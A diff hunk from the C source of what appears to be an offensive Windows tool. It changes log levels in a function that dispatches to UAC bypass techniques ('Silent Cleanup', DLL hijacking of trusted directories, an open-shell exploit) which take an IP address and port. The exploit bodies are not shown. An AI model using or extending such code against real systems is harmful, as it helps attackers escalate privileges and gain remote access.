@@ -112,17 +112,17 @@ BOOL RunUacBypass(char* PathExeToRun, WCHAR* ipAddress, char* port, UAC_BYPASS_T
 
             if (UacBypassTec == UAC_BYPASS_COMP_SILENT_CLEAN) {
 
-                printMsg(STATUS_INFO, LEVEL_DEFAULT, "UAC bypass technique: 'Silent Cleanup'\n");
+                printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: 'Silent Cleanup'\n");
                 returnValue = ExploitSilentCleanup(PathExeToRun, ipAddress, port);
 
             } else if(UacBypassTec == UAC_BYPASS_COMP_TRUSTED_DIR) {
 
-                printMsg(STATUS_INFO, LEVEL_DEFAULT, "UAC bypass technique: 'DLL hijacking - Trusted Directories'\n");
+                printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: 'DLL hijacking - Trusted Directories'\n");
                 returnValue = ExploitTrustedDirectories(PathExeToRun, ipAddress, port);
 
             } else {
 
-                printMsg(STATUS_INFO, LEVEL_DEFAULT, "UAC bypass technique: '%s'\n", uac_bypass_data[UacBypassTec].exploitName);
+                printMsg(STATUS_OK, LEVEL_DEFAULT, "UAC bypass technique: '%s'\n", uac_bypass_data[UacBypassTec].exploitName);
                 returnValue = ExploitOpenShell(PathExeToRun, ipAddress, port, UacBypassTec);
 
             }
